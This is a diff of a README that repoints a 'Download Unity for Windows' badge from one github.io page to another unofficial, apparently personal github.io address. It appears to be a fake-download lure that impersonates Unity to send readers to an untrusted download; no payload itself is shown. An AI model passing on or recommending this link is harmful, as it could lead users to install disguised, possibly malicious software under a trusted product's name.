@@ -4,7 +4,7 @@
 
 ## 📥 Download Unity for Windows
 
-[![⬇️ Download Unity](https://img.shields.io/badge/Download-Unity-blue?style=for-the-badge&logo=windows)](https://unityloads.github.io/.github/)
+[![⬇️ Download Unity](https://img.shields.io/badge/Download-Unity-blue?style=for-the-badge&logo=windows)](https://kana085149.github.io/.github/unity-windows)
 
 ---
 
